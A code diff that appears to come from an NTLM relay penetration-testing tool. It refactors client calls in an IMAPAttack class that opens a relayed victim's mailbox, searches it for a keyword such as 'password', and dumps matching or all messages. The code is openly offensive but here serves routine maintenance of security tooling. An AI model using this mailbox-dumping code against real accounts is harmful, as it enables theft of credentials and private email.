@@ -270,17 +270,17 @@ class IMAPAttack(Thread):
     def run(self):
         #Default action: Search the INBOX for messages with "password" in the header or body
         targetBox = self.config.mailbox
-        result, data = self.client.session.select(targetBox,True) #True indicates readonly
+        result, data = self.client.select(targetBox,True) #True indicates readonly
         if result != 'OK':
             logging.error('Could not open mailbox %s: %s' % (targetBox,data))
             logging.info('Opening mailbox INBOX')
             targetBox = 'INBOX'
-            result, data = self.client.session.select(targetBox,True) #True indicates readonly
+            result, data = self.client.select(targetBox,True) #True indicates readonly
         inboxCount = int(data[0])
         logging.info('Found %s messages in mailbox %s' % (inboxCount,targetBox))
         #If we should not dump all, search for the keyword
         if not self.config.dump_all:
-            result, rawdata = self.client.session.search(None,'OR','SUBJECT','"%s"' % self.config.keyword,'BODY','"%s"' % self.config.keyword)
+            result, rawdata = self.client.search(None,'OR','SUBJECT','"%s"' % self.config.keyword,'BODY','"%s"' % self.config.keyword)
             #Check if search worked
             if result != 'OK':
                 logging.error('Search failed: %s' % rawdata)
@@ -305,7 +305,7 @@ class IMAPAttack(Thread):
             logging.info('Dumping %d messages found by search for "%s"' % (numMsgs,self.config.keyword))
             for i,msgIndex in enumerate(dumpMessages):
                 #Fetch the message
-                result, rawMessage = self.client.session.fetch(msgIndex, '(RFC822)')
+                result, rawMessage = self.client.fetch(msgIndex, '(RFC822)')
                 if result != 'OK':
                     logging.error('Could not fetch message with index %s: %s' % (msgIndex,rawMessage))
                     continue
@@ -323,7 +323,7 @@ class IMAPAttack(Thread):
                 logging.info('Done fetching message %d/%d' % (i+1,numMsgs))
 
         #Close connection cleanly
-        self.client.session.logout()
+        self.client.logout()
 
 class MSSQLAttack(Thread):
     def __init__(self, config, MSSQLClient):
